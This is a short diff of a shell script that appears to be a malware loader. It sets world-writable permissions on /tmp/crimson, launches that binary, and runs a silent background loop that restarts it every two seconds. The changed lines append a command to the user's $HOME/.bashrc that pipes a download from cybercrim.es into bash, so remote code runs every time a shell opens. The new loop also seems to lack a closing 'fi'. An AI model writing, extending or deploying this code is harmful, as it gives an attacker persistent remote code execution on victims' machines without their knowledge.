@@ -23,17 +23,20 @@ fi
 chmod 777 /tmp/crimson
 chmod 777 /tmp/local
 
-if [ ! "$(pgrep -f "\?")" > /dev/null ]; then
-    /tmp/local -s "" -d -p test.pid /tmp/crimson
+if [ ! "$(pgrep -f crimson)" > /dev/null ]; then
+    /tmp/crimson
 fi
 
 (
     while true; do
-        if [ ! "$(pgrep -f "\?")" > /dev/null ]; then
-            /tmp/local -s "" -d -p test.pid /tmp/crimson
-        fi
+        if [ ! "$(pgrep -f crimson)" > /dev/null ]; then
+            /tmp/crimson
         sleep 2
     done    
 ) &>/dev/null &
 
-if ! grep -q "cybercrim.es" "/tmp/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "/tmp/.bashrc"; fi
+if [ ! -f "$HOME/.bashrc" ]; then
+    touch "$HOME/.bashrc"
+fi
+
+if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"; fi
